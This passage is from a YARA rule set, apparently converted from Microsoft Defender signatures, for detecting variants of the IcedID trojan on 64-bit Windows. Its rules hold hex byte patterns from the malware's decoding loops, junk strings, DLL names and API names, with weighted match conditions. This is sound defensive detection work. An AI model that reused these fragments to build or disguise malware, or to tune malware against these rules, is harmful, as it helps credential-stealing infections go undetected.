{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8a 44 24 23 0f b6 c0 8a 4c 24 20 0f b6 c9 33 c8 8b c1 88 44 24 20 8a 44 24 23 fe c0 88 44 24 23 48 8b 44 24 38 8a 4c 24 20 88 08 48 8b 44 24 38 48 ff c0 48 89 44 24 38 8b 44 24 28 ff c8 89 44 24 28}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {01 43 58 48 8b 83 a8 00 00 00 41 8b d0 c1 ea 10 88 14 01 41 8b d0 ff 43 6c}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "gyuashnjhsyfhja" ascii //weight: 10
        $x_1_2 = {10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_8_1 = {44 89 4c 24 20 4c 89 44 24 18 eb 64 b8 09 00 00 00 83 c0 03 eb 23 83 c0 1c 66 89 44 24 50 eb 0f c7 44 24 44 00 00 00 00 b8 01 00 00 00 eb 28}  //weight: 8, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "tyasbdhnahsdyuajsdka" ascii //weight: 2
        $x_2_2 = "VirtualAlloc" ascii //weight: 2
        $x_1_3 = "xcanesi5fers8lopdyts" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_6
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Magsjdbahsdjs" ascii //weight: 1
        $x_1_2 = "hJnCxCpjdEGITeu" ascii //weight: 1
        $x_1_3 = "lKkKbcWiNqtDt" ascii //weight: 1
        $x_1_4 = "RegisterClassExW" ascii //weight: 1
        $x_1_5 = "GetFocus" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_7
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DllRegisterServer" ascii //weight: 1
        $x_1_2 = "Recordsentence" ascii //weight: 1
        $x_1_3 = "VirtualAlloc" ascii //weight: 1
        $x_1_4 = "Totalsense\\body.pdb" ascii //weight: 1
        $x_1_5 = "VirtualProtect" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_8
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RGZlqixoctPgWCBc" ascii //weight: 1
        $x_1_2 = "UaXVBSdvjpSsbo" ascii //weight: 1
        $x_1_3 = "btQsyhcerhNNbDmz" ascii //weight: 1
        $x_1_4 = "hJjDOHlWBkUCqgaQ" ascii //weight: 1
        $x_1_5 = "iuasduyuagsdjasass" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_9
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "InitializeCriticalSectionEx" ascii //weight: 1
        $x_1_2 = "LCMapStringEx" ascii //weight: 1
        $x_1_3 = "LocaleNameToLCID" ascii //weight: 1
        $x_1_4 = "EXBs.dll" ascii //weight: 1
        $x_1_5 = "A3FftF" ascii //weight: 1
        $x_1_6 = "A3YDzfbCT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EC_2147807450_10
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EC!MTB"
        threat_id = "2147807450"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "ihasundijdsuhygbhjskdfsiufkjdsaisjoas" ascii //weight: 5
        $x_5_2 = "gyuasifiisdygaisjdoifguhyugasjsjuh" ascii //weight: 5
        $x_1_3 = "OpenProcess" ascii //weight: 1
        $x_1_4 = "GetCurrentProcessId" ascii //weight: 1
        $x_1_5 = "VirtualAlloc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_AA_2147807963_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AA!MTB"
        threat_id = "2147807963"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f af c8 2b d1 89 55 ?? 8b 4d ?? 8b 45 ?? 0f af c8 8b 45 ?? 2b c8 01 4d ?? 41 8b cf ff 15 ?? ?? ?? ?? 8b 45 ?? 8d 0c 80 89 4d ?? b9 ?? ?? ?? ?? 8b 45 ?? 2b c8 8b 45 ?? d3 f8 41 8b cf d1 f8 89 45 ?? ff 15 ?? ?? ?? ?? 8b 45 ?? 85 c0 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AA_2147807963_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AA!MTB"
        threat_id = "2147807963"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "101"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {f1 d5 00 fa 4c 62 cc f4 0f 0b}  //weight: 1, accuracy: High
        $x_100_2 = {41 0f b6 c9 4c 8d ?? ?? ?? 48 8d ?? ?? ?? 8d 41 ?? 83 e1 ?? 83 e0 ?? 48 8d 14 8a 41 8b 0c 80 4d 8d 04 80 41 0f b6 00 83 e1 ?? 02 02 41 32 04 31 41 88 04 19 49 ff c1 8b 02 d3 c8 ff c0 89 02 83 e0 ?? 0f b6 c8 41 8b 00 d3 c8 ff c0 41 89 00 48 8b ?? ?? ?? 4c 3b ?? ?? ?? 73 ?? 48 8b ?? ?? ?? eb}  //weight: 100, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AA_2147807963_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AA!MTB"
        threat_id = "2147807963"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f af c2 83 e0 01 83 f8 00 41 0f 94 c0 83 f9 0a 41 0f 9c c1 45 88 c2 41 80 f2 ff 45 88 cb 41 80 f3 ff b3 01 80 f3 01 44 88 d6 40 80 e6 ff 41 20 d8 44 88 df 40 80 e7 ff 41 20 d9 44 08 c6 44 08 cf 40 30 fe 45 08 da 41 80 f2 ff 80 cb 01 41 20 da 44 08 d6 40 f6 c6 01 b8 ?? ?? ?? ?? b9 ?? ?? ?? ?? 0f}  //weight: 1, accuracy: Low
        $x_1_2 = {88 c2 80 f2 ff 41 88 c8 41 80 f0 ff 41 b1 01 41 80 f1 01 41 88 d2 41 80 e2 ff 44 20 c8 45 88 c3 41 80 e3 ff 44 20 c9 41 08 c2 41 08 cb 45 30 da 44 08 c2 80 f2 ff 41 80 c9 01 44 20 ca 41 08 d2 41 f6 c2 01 be ?? ?? ?? ?? bf ?? ?? ?? ?? 0f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DE_2147809091_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DE!MTB"
        threat_id = "2147809091"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {83 44 24 58 2c c7 44 24 5c 54 00 00 00 66 3b db 74 44 83 44 24 68 13 c7 44 24 6c eb 01 00 00 3a d2 74 48 83 44 24 54 16 c7 44 24 58 17 00 00 00 3a d2 74 cc}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DE_2147809091_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DE!MTB"
        threat_id = "2147809091"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "21"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "oemgplnn.dll" ascii //weight: 3
        $x_3_2 = "benptaqmpsofuw" ascii //weight: 3
        $x_3_3 = "gmobmfort" ascii //weight: 3
        $x_3_4 = "rVdvbMsiecswr.p2b3yvsBrYl-r" ascii //weight: 3
        $x_3_5 = "b_siecswr" ascii //weight: 3
        $x_3_6 = "RtlLookupFunctionEntry" ascii //weight: 3
        $x_3_7 = "HeapReAlloc" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DE_2147809091_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DE!MTB"
        threat_id = "2147809091"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "DllRegisterServer" ascii //weight: 10
        $x_1_2 = "J5V5DR.dll" ascii //weight: 1
        $x_1_3 = "cJPSzqHBMN" ascii //weight: 1
        $x_1_4 = "zlmkoZLQMd" ascii //weight: 1
        $x_1_5 = "HdQZgnE" ascii //weight: 1
        $x_1_6 = "rHqnYSA" ascii //weight: 1
        $x_1_7 = "kxFFt5.dll" ascii //weight: 1
        $x_1_8 = "DQeCfWsaaS" ascii //weight: 1
        $x_1_9 = "MzEcZXbzdF" ascii //weight: 1
        $x_1_10 = "phTqcsNgtrP" ascii //weight: 1
        $x_1_11 = "zDnFFlqDtA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_DG_2147809230_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DG!MTB"
        threat_id = "2147809230"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 83 c3 3f 8a 53 01 8a 0b 8a 43 ff 48 8d 5b 03 c0 e2 03 80 e1 07 0a d1 24 07 c0 e2 03 0a d0 43 88 14 08}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DG_2147809230_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DG!MTB"
        threat_id = "2147809230"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {0f 94 c2 0f 94 44 24 06 41 b9 ca 48 06 3d 41 b8 ba d4 b5 2d b8 ba d4 b5 2d 41 0f 44 c1 83 f9 0a 0f 9c 44 24 07 0f 9c c1 41 0f 4d c0 30 d1 41 0f 45 c1}  //weight: 10, accuracy: High
        $x_3_2 = "JtmxrdpjroUaibrwm" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DG_2147809230_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DG!MTB"
        threat_id = "2147809230"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "qaeoM.dll" ascii //weight: 10
        $x_1_2 = "LSE2f7X8YDQ" ascii //weight: 1
        $x_1_3 = "UaCY5lKwjIv" ascii //weight: 1
        $x_1_4 = "jhbfgyujghfgd" ascii //weight: 1
        $x_1_5 = "gAADYu8ZG" ascii //weight: 1
        $x_1_6 = "XK4TN8C6J" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DG_2147809230_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DG!MTB"
        threat_id = "2147809230"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {65 48 8b 04 25 60 00 00 00 48 89 84 24 90 00 00 00 48 8b 84 24 90 00 00 00 48 8b 40 18 48 89 84 24 80 00 00 00 48 c7 44 24 40 00 00 00 00 48 c7 44 24 38 00 00 00 00 b8 08 00 00 00 48 6b c0 01 48 8b 8c 24 80 00 00 00 48 8b 44 01 08 48 89 44 24 50 eb 17}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DG_2147809230_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DG!MTB"
        threat_id = "2147809230"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "PluginInit" ascii //weight: 3
        $x_3_2 = "AftproqsChppaoqtUcaddgcx" ascii //weight: 3
        $x_3_3 = "FfaqxjqxtFzlkjfxhkmbkdk" ascii //weight: 3
        $x_3_4 = "OhaxeroAsevvqad" ascii //weight: 3
        $x_3_5 = "ZgbgofnVvxtsyapqxbg" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DF_2147809307_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DF!MTB"
        threat_id = "2147809307"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 44 8c 20 35 69 45 9a 36 89 44 8c 20 48 ff c1 48 83 f9 04 72 ea}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DF_2147809307_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DF!MTB"
        threat_id = "2147809307"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {88 04 0a e9 ?? ?? ?? ?? eb ?? f7 7c 24 ?? 8b c2 66 3b c0 74 ?? 33 c1 48 63 4c 24 ?? 3a ff 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DF_2147809307_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DF!MTB"
        threat_id = "2147809307"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 c8 f7 ea 8d 04 0a c1 f8 ?? 89 c2 89 c8 c1 f8 ?? 29 c2 89 d0 89 c2 8d 04 12 89 c2 89 d0 c1 e0 ?? 29 d0 29 c1 89 c8 48 98 4c 01 d0 0f b6 00 44 31 c8 41 88 00 83 85 ?? ?? ?? ?? 01 8b 85 ?? ?? ?? ?? 3b 85 ?? ?? ?? ?? 7c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DR_2147809572_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DR!MTB"
        threat_id = "2147809572"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 4d 78 8b c7 41 0f af c8 2b c1 44 0f af c0 8b 4d 78 8b 85 80 00 00 00 03 c8 b8 56 55 55 55 f7 e9 8b c2 c1 e8 1f 03 d0 8d 04 52}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DR_2147809572_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DR!MTB"
        threat_id = "2147809572"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8d 50 ff 0f af d0 89 d0 83 f0 fe 85 d0 0f 94 c2 0f 94 44 24 06 41 b9 ab d8 35 48 41 b8 a0 2a 8a 08 b8 a0 2a 8a 08 41 0f 44 c1 83 f9 0a 0f 9c 44 24}  //weight: 10, accuracy: High
        $x_3_2 = "SsxlyksmUpedpfjtbMmxtykjc" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DR_2147809572_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DR!MTB"
        threat_id = "2147809572"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "qpKOp.dll" ascii //weight: 10
        $x_1_2 = "CaoVVTH6JL" ascii //weight: 1
        $x_1_3 = "DGFIu0fljv" ascii //weight: 1
        $x_1_4 = "HBpysRfNYZ" ascii //weight: 1
        $x_1_5 = "HLvHSTU1SL" ascii //weight: 1
        $x_10_6 = "OkADxPJh.dll" ascii //weight: 10
        $x_1_7 = "IUV4IVQynl7" ascii //weight: 1
        $x_1_8 = "agjhsahjasksd" ascii //weight: 1
        $x_1_9 = "qCzgd91h9" ascii //weight: 1
        $x_1_10 = "uAfSbSjqPd2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_GE_2147809904_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GE!MTB"
        threat_id = "2147809904"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "Dll\\cryptERRDll.pdb" ascii //weight: 3
        $x_3_2 = "a6w0xkkfa8xr" ascii //weight: 3
        $x_3_3 = "ao3pdxpbt2l2kqdisxs3qls" ascii //weight: 3
        $x_3_4 = "InternetCanonicalizeUrlA" ascii //weight: 3
        $x_3_5 = "HttpAddRequestHeadersA" ascii //weight: 3
        $x_3_6 = "HttpSendRequestA" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win64_IcedID_2147810548_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.rrdh!MTB"
        threat_id = "2147810548"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "rrdh: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8a 0a 48 8d 52 02 88 4c 24 30 8a 44 24 30 83 e8 21 88 44 24 30 c0 64 24 30 04 8a 44 24 30 88 44 24 38 8a 42 ff 88 44 24 30 8a 44 24 30 83 e8 34 88 44 24 30 0f b6 44 24 38 8a 4c 24 30 0b c8 88 4c 24 38 0f b6 44 24 38 8a 4c 24 40 33 c8 88 4c 24 38 fe 44 24 40 8a 44 24 38 41 88 00 49 ff c0 83 44 24 48 ff 8b 44 24 48 75 95}  //weight: 10, accuracy: High
        $x_1_2 = "BttfjsirzzShnbwayag" ascii //weight: 1
        $x_1_3 = "DxhchdblvOvuEwtugntbu" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DM_2147810745_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DM!MTB"
        threat_id = "2147810745"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {0f b6 45 28 8a 4d 30 33 c8 66 0f 6e c7 88 4d 28 89 5d 20}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DM_2147810745_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DM!MTB"
        threat_id = "2147810745"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {42 8a 0c 2a 88 0a 48 ff c2 83 c0}  //weight: 1, accuracy: High
        $x_1_2 = {41 8b c0 41 ff c0 83 e0 ?? 42 8a 44 20 ?? 30 01 48 ff c1 44 3b c3 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DM_2147810745_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DM!MTB"
        threat_id = "2147810745"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "exgDX.dll" ascii //weight: 1
        $x_1_3 = "CoFileTimeToDosDateTime" ascii //weight: 1
        $x_1_4 = "GetPolyFillMode" ascii //weight: 1
        $x_1_5 = "CreatePalette" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_GBC_2147810963_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.GBC!MTB"
        threat_id = "2147810963"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8b 44 24 24 8b c0 48 8b 4c 24 50 8a 04 01 88 44 24 2c 8a 44 24 2c 0f b6 c0 48 8b 4c 24 38 8a 04 01 0f b6 c0 8a 4c 24 20 0f b6 c9 33 c1 8b 4c 24 24 8b c9 88 44 0c 60 8a 44 24 20 fe c0 88 44 24 20 8b 44 24 24 ff c0 89 44 24 24 8b 44 24 24 3d 00 01 00 00 73 02 eb a8}  //weight: 10, accuracy: High
        $x_10_2 = {48 8b 44 24 48 8a 4c 24 21 88 08 48 8b 44 24 48 48 ff c0 48 89 44 24 48 8b 44 24 28 ff c8 89 44 24 28 83 7c 24 28 00 74 02 eb 89}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DER_2147811071_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DER!MTB"
        threat_id = "2147811071"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8a 4c 24 2a 8a 54 24 29 89 d3 44 30 fb 44 20 d3 44 20 da 08 da 89 cb 44 30 fb 44 20 d3 44 20 d9 08 d9 30 d1 88 4c 24 29}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

